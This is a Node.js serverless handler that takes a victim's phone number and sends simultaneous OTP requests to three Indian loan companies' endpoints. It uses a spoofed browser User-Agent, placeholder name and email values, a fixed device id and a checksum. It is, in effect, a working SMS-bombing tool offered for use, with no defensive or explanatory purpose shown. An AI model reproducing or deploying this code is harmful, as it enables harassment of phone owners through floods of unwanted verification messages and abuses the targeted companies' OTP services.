const axios = require('axios');

module.exports = async (req, res) => {
    const { mob } = req.query;

    if (!mob || mob.length < 10) {
        return res.status(400).json({ error: "Valid 10-digit number required" });
    }

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://www.google.com/'
    };

    // Helper function to handle individual API failures without crashing the whole script
    const safePost = async (url, data) => {
        try {
            const response = await axios.post(url, new URLSearchParams(data).toString(), { headers, timeout: 4000 });
            return response.status;
        } catch (error) {
            return error.response ? error.response.status : "timeout/failed";
        }
    };

    // Fire all 3 at once
    const [avanse, bright, stashfin] = await Promise.all([
        safePost('https://www.avanse.com/common-loan-apply/otp', {
            'contactNumber': mob,
            'pageUrl': 'New Student Loan',
            'name': 'Ckv Jvn',
            'emailId': 'newuser.comop@gmail.com'
        }),
        safePost('https://brightloans.in/login-sbm', {
            'mobile': mob,
            'current_page': 'login',
            'device_id': '3c2f1fb977b9f389dc7e60f5f3fa9c44'
        }),
        safePost('https://api.stashfin.com/v2/api/', {
            'phone': mob,
            'mode': 'generate_otp',
            'checksum': 'f5d551b1531459cf6eee963f0476fc7b6079d9dd01a46e33beb7677d5e021e3c'
        })
    ]);

    res.status(200).json({
        success: true,
        results: { avanse, bright, stashfin }
    });
};
